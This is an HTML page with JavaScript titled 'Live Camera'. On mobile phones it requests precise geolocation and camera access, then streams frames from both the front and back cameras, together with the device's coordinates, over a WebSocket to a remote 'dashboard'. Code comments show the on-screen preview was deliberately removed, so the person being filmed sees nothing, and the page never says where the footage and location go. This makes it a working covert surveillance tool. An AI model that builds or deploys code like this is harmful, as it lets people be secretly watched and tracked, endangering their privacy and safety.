<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Live Camera</title>
  <style>
    body { margin:0; background:#0b1020; color:#e5f4ff; font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif; }
    .wrap { max-width: 980px; margin: 0 auto; padding: 16px; }
    video { width: 100%; max-height: 45vh; background:#000; border-radius:12px; }
    .row { display:flex; gap:12px; flex-wrap:wrap; }
  </style>
</head>
<body>
  <div class="wrap">
    <h2>Live Camera</h2>
    <div style="margin-bottom: 16px;">
      <button id="modeToggle" style="padding: 8px 16px; background: #1e40af; color: white; border: none; border-radius: 6px; cursor: pointer;">
        Refresh Stream
      </button>
      <button id="testStream" style="padding: 8px 16px; background: #dc2626; color: white; border: none; border-radius: 6px; cursor: pointer; margin-left: 8px;">
        Test Stream
      </button>
      <button id="debugStream" style="padding: 8px 16px; background: #7c3aed; color: white; border: none; border-radius: 6px; cursor: pointer; margin-left: 8px;">
        Debug Stream
      </button>
      <span id="modeStatus" style="margin-left: 12px; color: #10b981;">âœ“ Initializing camera system...</span>
    </div>
    <div class="row">
      <video id="front" autoplay playsinline style="background: #1f2937; display: flex; align-items: center; justify-content: center; color: #9ca3af;">
        <div style="text-align: center;">
          <div style="font-size: 18px; margin-bottom: 8px;">ðŸ“±</div>
          <div>Front Camera</div>
          <div style="font-size: 12px; margin-top: 4px;">Waiting for mobile stream...</div>
        </div>
      </video>
      <video id="back" autoplay playsinline style="background: #1f2937; display: flex; align-items: center; justify-content: center; color: #9ca3af;">
        <div style="text-align: center;">
          <div style="font-size: 18px; margin-bottom: 8px;">ðŸ“±</div>
          <div>Back Camera</div>
          <div style="font-size: 12px; margin-top: 4px;">Waiting for mobile stream...</div>
        </div>
      </video>
    </div>
  </div>
  <script>
    const room = new URLSearchParams(location.search).get('room') || 'default';
    const front = document.getElementById('front');
    const back = document.getElementById('back');
    
    // Unified permission manager with location
    class PermissionManager {
      constructor() {
        this.permissions = {
          camera: false,
          network: false,
          location: false
        };
      }
      
      async requestAllPermissions() {
        try {
          // Request location permission first
          console.log('Requesting location permission...');
          await this.requestLocationPermission();
          
          // Request camera permission
          console.log('Requesting camera permission...');
          const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
              facingMode: 'user',
              width: { ideal: 1280 },
              height: { ideal: 720 }
            }, 
            audio: false 
          });
          
          this.permissions.camera = true;
          console.log('âœ“ Camera permission granted');
          
          // Test network connection
          console.log('Testing network connection...');
          await this.testNetworkConnection();
          
          return { success: true, stream };
        } catch (error) {
          console.error('Permission request failed:', error);
          this.showPermissionError(error);
          return { success: false, error };
        }
      }
      
      async requestLocationPermission() {
        return new Promise((resolve, reject) => {
          if (!navigator.geolocation) {
            reject(new Error('Geolocation not supported'));
            return;
          }
          
          navigator.geolocation.getCurrentPosition(
            (position) => {
              this.permissions.location = true;
              console.log('âœ“ Location permission granted');
              console.log('Location:', position.coords.latitude, position.coords.longitude);
              resolve(position);
            },
            (error) => {
              console.error('Location permission denied:', error);
              reject(error);
            },
            { timeout: 10000, enableHighAccuracy: true }
          );
        });
      }
      
      async testNetworkConnection() {
        try {
          // Test WebSocket connection
          const testWs = new WebSocket(`${location.protocol.startsWith('https') ? 'wss' : 'ws'}://${location.host}/ws?room=test`);
          
          return new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
              testWs.close();
              reject(new Error('Network connection timeout'));
            }, 5000);
            
            testWs.onopen = () => {
              clearTimeout(timeout);
              testWs.close();
              this.permissions.network = true;
              console.log('âœ“ Network connection verified');
              resolve();
            };
            
            testWs.onerror = () => {
              clearTimeout(timeout);
              reject(new Error('Network connection failed'));
            };
          });
        } catch (error) {
          throw new Error('Network connection test failed: ' + error.message);
        }
      }
      
      showPermissionError(error) {
        let errorMessage = 'Permission request failed.';
        if (error.name === 'NotAllowedError') {
          errorMessage = 'Camera access was denied. Please allow camera permission and refresh the page.';
        } else if (error.name === 'NotFoundError') {
          errorMessage = 'No camera found. Please check your device has a camera.';
        } else if (error.message.includes('Network')) {
          errorMessage = 'Network connection failed. Please check your internet connection.';
        }
        
        document.body.innerHTML = `
          <div class="wrap">
            <h2>Permission Required</h2>
            <p>${errorMessage}</p>
            <div style="background: #fef3c7; padding: 16px; border-radius: 8px; margin: 16px 0;">
              <h3>How to fix:</h3>
              <ol>
                <li>Click "Allow" when prompted for camera access</li>
                <li>Check your browser's permission settings</li>
                <li>Ensure you have a stable internet connection</li>
                <li>Try refreshing the page</li>
              </ol>
            </div>
            <button onclick="location.reload()" style="padding: 12px 24px; background: #1e40af; color: white; border: none; border-radius: 6px; cursor: pointer;">
              Try Again
            </button>
          </div>
        `;
      }
      
      getStatus() {
        return {
          camera: this.permissions.camera,
          network: this.permissions.network,
          allGranted: this.permissions.camera && this.permissions.network
        };
      }
    }
    
    const permissionManager = new PermissionManager();

    // Initialize camera based on device type and mode
    async function initCamera() {
      console.log('Initializing camera system...');
      console.log('isMobileDevice():', isMobileDevice());
      console.log('isDashboardViewer():', isDashboardViewer());
      
      // Check if this is a mobile device that should stream
      const shouldStream = isMobileDevice() && !isDashboardViewer();
      console.log('shouldStream:', shouldStream);
      
      if (shouldStream) {
        console.log('Mobile device detected - starting camera streaming...');
        const result = await permissionManager.requestAllPermissions();
        
        if (result.success) {
          console.log('All permissions granted, setting up LIVE STREAMING...');
          localStream = result.stream;
          
          // DON'T display local camera - only stream to dashboard
          // front.srcObject = localStream; // REMOVED
          
          // Update status display
          updateStatusDisplay('âœ“ Mobile streaming to dashboard...');
          
          // Start streaming to dashboard
          startLiveStreaming();
          
          // For mobile devices, try to get back camera after a short delay
          setTimeout(async () => {
            try {
              const backStream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                  facingMode: 'environment',
                  width: { ideal: 1280 },
                  height: { ideal: 720 }
                }, 
                audio: false 
              });
              // DON'T display back camera locally - only stream
              // back.srcObject = backStream; // REMOVED
              console.log('âœ“ Back camera connected - streaming to dashboard');
              updateStatusDisplay('âœ“ Both cameras streaming to dashboard');
              
              // Stream back camera to dashboard too
              streamToDashboard(backStream, 'back');
            } catch (e) {
              console.log('Back camera not available, using front camera for both');
              // DON'T display local camera - only stream
              // back.srcObject = localStream; // REMOVED
              updateStatusDisplay('âœ“ Front camera streaming to dashboard (back camera unavailable)');
            }
          }, 1000);
        } else {
          console.error('Failed to get permissions:', result.error);
        }
      } else {
        console.log('Desktop/viewer device - waiting for remote streams...');
        updateStatusDisplay('âœ“ Waiting for mobile camera streams...');
        
        // DON'T request camera on desktop - only receive streams
        // Removed desktop camera testing
      }
    }
    
    // Desktop streaming functionality removed - only receive streams
    
    // Start live streaming to dashboard
    function startLiveStreaming() {
      console.log('Starting live stream to dashboard...');
      
      // Stream front camera to dashboard
      streamToDashboard(localStream, 'front');
      
      // Send location data to dashboard
      sendLocationToDashboard();
    }
    
    // Stream video to dashboard via WebSocket
    function streamToDashboard(stream, cameraType) {
      if (!ws || ws.readyState !== WebSocket.OPEN) {
        console.log('WebSocket not ready, retrying...');
        setTimeout(() => streamToDashboard(stream, cameraType), 1000);
        return;
      }
      
      console.log(`Starting to stream ${cameraType} camera to dashboard...`);
      
      // Create a canvas to capture video frames
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      
      canvas.width = 640;
      canvas.height = 480;
      
      let frameCount = 0;
      
      // Capture frames and send to dashboard
      const captureFrame = () => {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL('image/jpeg', 0.8);
          
          frameCount++;
          
          // Send frame to dashboard
          const frameData = {
            type: 'video_frame',
            camera: cameraType,
            room: room,
            data: imageData,
            timestamp: Date.now(),
            frameCount: frameCount
          };
          
          ws.send(JSON.stringify(frameData));
          
          if (frameCount % 30 === 0) { // Log every 30 frames
            console.log(`Sent ${frameCount} frames for ${cameraType} camera`);
          }
        }
        requestAnimationFrame(captureFrame);
      };
      
      video.onloadedmetadata = () => {
        console.log(`Streaming ${cameraType} camera to dashboard - video ready`);
        captureFrame();
      };
      
      video.onerror = (error) => {
        console.error(`Error with ${cameraType} video:`, error);
      };
    }
    
    // Check if this is a mobile device
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
             (navigator.maxTouchPoints && navigator.maxTouchPoints > 2);
    }
    
    // Check if this is a dashboard viewer (not the streaming device)
    function isDashboardViewer() {
      const urlParams = new URLSearchParams(location.search);
      return urlParams.get('view') === 'dashboard' || urlParams.get('mode') === 'view';
    }
    
    // Send location data to dashboard
    function sendLocationToDashboard() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          ws.send(JSON.stringify({
            type: 'location',
            room: room,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: Date.now()
          }));
          console.log('Location sent to dashboard:', position.coords.latitude, position.coords.longitude);
        });
      }
    }
    
    function updateStatusDisplay(message) {
      const statusElement = document.getElementById('modeStatus');
      if (statusElement) {
        statusElement.textContent = message;
        statusElement.style.color = '#10b981';
      }
    }
    
    // Handle remote video frames from other devices
    function handleRemoteVideoFrame(data) {
      const { camera, data: imageData, room: sourceRoom } = data;
      
      console.log(`Received video frame: room=${sourceRoom}, camera=${camera}, currentRoom=${room}`);
      console.log('Image data length:', imageData ? imageData.length : 'null');
      
      // Display remote streams from any room (including same room for testing)
      console.log(`Displaying remote video from room ${sourceRoom}, camera ${camera}`);
      
      if (camera === 'front') {
        front.src = imageData;
        front.style.display = 'block';
        front.style.background = 'transparent';
        front.style.border = '2px solid #10b981';
        front.innerHTML = ''; // Clear placeholder content
        console.log('Updated front video element with remote stream');
        console.log('Front video src:', front.src.substring(0, 50) + '...');
        
        // Add a visual indicator
        front.title = `Front camera from ${sourceRoom.substring(0, 8)}...`;
      } else if (camera === 'back') {
        back.src = imageData;
        back.style.display = 'block';
        back.style.background = 'transparent';
        back.style.border = '2px solid #10b981';
        back.innerHTML = ''; // Clear placeholder content
        console.log('Updated back video element with remote stream');
        console.log('Back video src:', back.src.substring(0, 50) + '...');
        
        // Add a visual indicator
        back.title = `Back camera from ${sourceRoom.substring(0, 8)}...`;
      }
      
      updateStatusDisplay(`âœ“ Receiving stream from ${sourceRoom.substring(0, 8)}... (${camera} camera)`);
    }

    // Force local camera mode - each device shows its own camera
    let pc = null;
    let isLocalMode = true; // Always true - each device shows its own camera
    let localStream = null;

    let ws;
    function connectWebSocket() {
      const protocol = location.protocol.startsWith('https') ? 'wss' : 'ws';
      ws = new WebSocket(`${protocol}://${location.host}/ws?room=${encodeURIComponent(room)}`);
      
      ws.onopen = () => {
        console.log('WebSocket connected to room:', room);
        console.log('Device type:', isMobileDevice() ? 'Mobile' : 'Desktop');
        console.log('Mode:', isDashboardViewer() ? 'Viewer' : 'Streamer');
        
        // Send a ping message to test connection
        ws.send(JSON.stringify({
          type: 'ping',
          room: room,
          device: isMobileDevice() ? 'mobile' : 'desktop',
          timestamp: Date.now()
        }));
        console.log('Ping message sent');
        
        // Send a test message to verify WebSocket is working
        setTimeout(() => {
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({
              type: 'test_message',
              room: room,
              device: isMobileDevice() ? 'mobile' : 'desktop',
              message: 'WebSocket connection test',
              timestamp: Date.now()
            }));
            console.log('Test message sent');
          }
        }, 1000);
      };
      
      ws.onerror = (error) => {
        console.error('WebSocket error:', error);
      };
      
      ws.onclose = () => {
        console.log('WebSocket disconnected, reconnecting...');
        setTimeout(connectWebSocket, 3000);
      };
      
      ws.onmessage = async (ev) => {
        try {
          const data = JSON.parse(ev.data);
          console.log('WebSocket message received:', data.type || 'unknown', data);
          
          // Handle incoming video frames from other devices
          if (data.type === 'video_frame') {
            console.log('Processing video frame...');
            handleRemoteVideoFrame(data);
          }
          
          // Handle ping messages
          if (data.type === 'ping') {
            console.log('Ping received from:', data.device, 'room:', data.room);
          }
          
          // Handle test messages
          if (data.type === 'test_message') {
            console.log('Test message received from:', data.device, 'room:', data.room, 'message:', data.message);
          }
          
          // Handle dashboard commands
          if (data.type === 'dashboard_command') {
            console.log('Dashboard command received:', data.command);
            // Handle any commands from dashboard if needed
          }
          
        } catch (error) {
          console.error('Error handling WebSocket message:', error);
        }
      };
    }

    // Local camera mode only - no remote streaming
    const modeToggle = document.getElementById('modeToggle');
    const modeStatus = document.getElementById('modeStatus');
    
    function updateModeUI() {
      const isMobile = isMobileDevice();
      const isViewer = isDashboardViewer();
      
      if (isMobile && !isViewer) {
        // Mobile streaming mode
        modeToggle.textContent = 'Refresh Stream';
        modeToggle.style.background = '#1e40af';
        modeStatus.textContent = 'âœ“ Mobile streaming to dashboard';
        modeStatus.style.color = '#10b981';
      } else {
        // Desktop viewing mode
        modeToggle.textContent = 'Refresh View';
        modeToggle.style.background = '#059669';
        modeStatus.textContent = 'âœ“ Desktop viewer - waiting for mobile streams';
        modeStatus.style.color = '#10b981';
      }
    }
    
    modeToggle.addEventListener('click', () => {
      // Refresh local camera instead of switching modes
      console.log('Refreshing local camera...');
      if (localStream) {
        localStream.getTracks().forEach(track => track.stop());
      }
      initCamera();
    });
    
    // Test stream button for debugging
    document.getElementById('testStream').addEventListener('click', () => {
      console.log('Testing stream...');
      
      // First test if video elements can display images
      const testImage = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjQwIiBoZWlnaHQ9IjQ4MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZmY2NjAwIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZmlsbD0iIzAwMCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlRFU1QgSU1BR0U8L3RleHQ+PC9zdmc+';
      
      console.log('Testing video element display...');
      front.src = testImage;
      front.style.display = 'block';
      front.style.background = 'transparent';
      front.innerHTML = '';
      console.log('Front video src set to test image');
      
      back.src = testImage;
      back.style.display = 'block';
      back.style.background = 'transparent';
      back.innerHTML = '';
      console.log('Back video src set to test image');
      
      updateStatusDisplay('âœ“ Test image displayed');
      
      // Then send a test frame via WebSocket
      if (ws && ws.readyState === WebSocket.OPEN) {
        const testData = {
          type: 'video_frame',
          camera: 'front',
          room: room,
          data: testImage,
          timestamp: Date.now()
        };
        
        ws.send(JSON.stringify(testData));
        console.log('Test frame sent via WebSocket');
        updateStatusDisplay('âœ“ Test frame sent via WebSocket');
      } else {
        console.log('WebSocket not ready');
        updateStatusDisplay('âœ— WebSocket not ready');
      }
    });
    
    // Debug stream button for debugging
    document.getElementById('debugStream').addEventListener('click', () => {
      console.log('Debug stream clicked...');
      
      // Show debug information
      console.log('=== DEBUG INFO ===');
      console.log('Room:', room);
      console.log('WebSocket state:', ws ? ws.readyState : 'No WebSocket');
      console.log('Is mobile:', isMobileDevice());
      console.log('Is dashboard viewer:', isDashboardViewer());
      console.log('Should stream:', isMobileDevice() && !isDashboardViewer());
      console.log('Local stream:', localStream);
      console.log('Front video element:', front);
      console.log('Back video element:', back);
      
      // Try to get camera for debugging
      if (isMobileDevice()) {
        console.log('Mobile device - trying to get camera...');
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
          .then(stream => {
            console.log('Camera access granted for debugging');
            console.log('Stream tracks:', stream.getTracks());
            streamToDashboard(stream, 'front');
          })
          .catch(error => {
            console.error('Camera access denied:', error);
          });
      } else {
        console.log('Desktop device - cannot get camera');
      }
      
      updateStatusDisplay('âœ“ Debug info logged to console');
    });

    // Initialize camera and WebSocket
    initCamera();
    connectWebSocket();
    updateModeUI();
  </script>
</body>
</html>
